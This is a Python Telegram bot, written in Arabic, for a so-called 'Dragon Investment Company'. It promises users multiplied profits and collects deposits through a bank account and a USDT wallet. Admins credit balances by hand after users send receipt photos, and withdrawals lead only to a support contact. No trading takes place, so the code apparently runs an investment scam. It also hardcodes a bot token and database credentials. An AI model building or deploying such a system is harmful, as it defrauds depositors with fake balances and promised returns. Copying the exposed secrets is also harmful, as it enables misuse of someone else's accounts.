import os
import urllib.parse
import logging
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- ⚙️ 1. الإعدادات وسجلات النظام ---
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

flask_app = Flask('')
@flask_app.route('/')
def home(): return "🚀 Dragon Mega-System is Online"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask); t.daemon = True; t.start()

# --- 🔑 2. البيانات الحساسة وعناوين الشركة ---
TOKEN ='8731999916:AAHDjo1noyGIbUH699aTjNns9kCjP8P9SHc' 
ADMINS_LIST = [6016547718] 
SUPPORT_LINK = "https://t.me/HCICICVICIF9"

# 🏦 بيانات الدفع التي تظهر للمستثمرين
BANK_INFO = "🏦 **بيانات التحويل البنكي:**\n\nالراجحي: `123456789012345`\nالاسم: شركة التنين للاستثمار"
USDT_INFO = "🔗 **محفظة USDT (TRC20):**\n\nالعنوان: `TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA`"

# تشفير الدخول للقاعدة
u_enc = urllib.parse.quote_plus('Abduh')
p_enc = urllib.parse.quote_plus('A11223344@5566')
MONGO_URI = f"mongodb+srv://{u_enc}:{p_enc}@cluster0.0a4wefx.mongodb.net/Dragon_Final_System?retryWrites=true&w=majority"

PRICES_SAR = ["1000", "2000", "5000", "10000", "20000", "50000"]
PRICES_USD = ["300", "500", "1000", "2000", "5000", "10000"]

# --- 🗄️ 3. قاعدة البيانات ---
users_col = None
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
    db = client.get_database()
    users_col = db['investors']
    client.admin.command('ping')
    logger.info("✅ Database Connected!")
except Exception as e:
    logger.error(f"❌ DB Connection Failed: {e}")

# --- 🛠️ 4. محرك العمليات ---
def get_user(uid):
    default = {"uid": int(uid), "sar": 0.0, "usd": 0.0, "trades": 0}
    if users_col is None: return default
    try:
        user = users_col.find_one({"uid": int(uid)})
        if not user:
            users_col.insert_one(default)
            return default
        return user
    except: return default

# --- 🏠 5. واجهات البوت (كاملة دون نقصان) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logger.info(f"🚀 Start received from {user.id}")
    
    txt = (
        f"👑 **مرحباً بك في شركة التنين للاستثمار**\n\n"
        f"المستثمر: **{user.first_name}**\n"
        f"رقم العضوية: `{user.id}`\n\n"
        "ابدأ رحلتك الاستثمارية اليوم بمضاعفة أرباحك مع نظامنا المتطور."
    )
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (SAR)", callback_data='dep_sr'), InlineKeyboardButton("🇺🇸 استثمار (USDT)", callback_data='dep_us')],
        [InlineKeyboardButton("💳 محفظتي الشخصية", callback_data='wallet'), InlineKeyboardButton("📈 صفقاتي النشطة", callback_data='trades')],
        [InlineKeyboardButton("📤 طلب سحب أرباح", callback_data='withdraw')],
        [InlineKeyboardButton("👨‍💻 التواصل مع الدعم", url=SUPPORT_LINK)]
    ]
    
    if update.message:
        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data; uid = query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)
    
    elif data == 'wallet':
        u = get_user(uid)
        text = f"🏦 **تفاصيل محفظتك الاستثمارية:**\n\n💰 رصيد ريال: `{u.get('sar', 0):,}`\n💰 رصيد دولار: `{u.get('usd', 0):,}`\n\n🛡️ _أموالك مؤمنة بنظام التشفير العالمي._"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'trades':
        u = get_user(uid)
        text = f"📈 **حالة صفقاتك:**\n\nعدد الصفقات النشطة: `{u.get('trades', 0)}` \nحالة التداول: 🟢 نشط (أرباح تراكمية)"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'withdraw':
        await query.edit_message_text(f"📤 **طلب سحب الأرباح:**\n\nيرجى التواصل مع الإدارة المالية لتأكيد وسيلة السحب:\n{SUPPORT_LINK}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة", callback_data='main')]]))

    elif data in ['dep_sr', 'dep_us']:
        curr = 'sr' if data == 'dep_sr' else 'us'
        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
        # ترتيب الأزرار 2 في كل صف
        btns = [[InlineKeyboardButton(f"{p}", callback_data=f"sel_{curr}_{p}") for p in prices[i:i+2]] for i in range(0, 6, 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع للقائمة", callback_data='main')])
        await query.edit_message_text("📊 **اختر مبلغ الاستثمار المفضل:**", reply_markup=InlineKeyboardMarkup(btns))

    elif data.startswith('sel_'):
        _, curr, amt = data.split('_')
        info = BANK_INFO if curr == 'sr' else USDT_INFO
        await query.edit_message_text(f"✨ **طلب إيداع بمبلغ {amt}**\n\nيرجى التحويل إلى:\n{info}\n\n📸 **أرسل صورة الإيصال هنا فوراً ليتم التفعيل.**", parse_mode='Markdown')

    # --- إدارة الأزرار الذكية للمالك ---
    elif data.startswith(('ok_', 'no_')):
        if uid not in ADMINS_LIST: return
        if data.startswith('ok_'):
            _, curr, amt, tid = data.split('_')
            if users_col is not None:
                users_col.update_one({"uid": int(tid)}, {"$inc": {"sar" if curr=="sr" else "usd": float(amt), "trades": 1}}, upsert=True)
            await query.edit_message_caption(caption=f"✅ **تم الاعتماد والشحن بنجاح!**\nالمبلغ: {amt}\nللمستثمر: {tid}")
            try: await context.bot.send_message(chat_id=int(tid), text=f"🎉 **بشرى سارة!**\nتم تأكيد إيداعك بقيمة `{amt}` وتفعيل صفقتك الاستثمارية.")
            except: pass
        else:
            await query.edit_message_caption(caption="❌ **تم رفض الإيصال.**")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        user = update.effective_user
        await update.message.reply_text("⏳ **تم استلام إيصالك، جاري التدقيق من قبل الإدارة..**")
        
        # إنشاء أزرار الإدارة (كل مبالغ الريال ثم كل مبالغ الدولار)
        kb_sr = [[InlineKeyboardButton(f"🇸🇦 {p}", callback_data=f"ok_sr_{p}_{user.id}") for p in PRICES_SAR[i:i+3]] for i in range(0, 6, 3)]
        kb_us = [[InlineKeyboardButton(f"💵 {p}$", callback_data=f"ok_us_{p}_{user.id}") for p in PRICES_USD[i:i+3]] for i in range(0, 6, 3)]
        
        admin_kb = kb_sr + kb_us
        admin_kb.append([InlineKeyboardButton("🚫 رفض نهائي", callback_data=f"no_{user.id}")])

        for admin in ADMINS_LIST:
            await context.bot.send_photo(chat_id=admin, photo=update.message.photo[-1].file_id, 
                                       caption=f"🔔 **إيداع جديد:**\nالمستثمر: {user.first_name}\nID: `{user.id}`", 
                                       reply_markup=InlineKeyboardMarkup(admin_kb))

# --- 🚀 6. الانطلاق النهائي ---
if __name__ == '__main__':
    keep_alive()
    app = Application.builder().token(TOKEN).build()
    
    # المعالجات
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), start))
    
    logger.info("🔥 DRAGON UNIVERSAL SYSTEM DEPLOYED!")
    app.run_polling(drop_pending_updates=True)
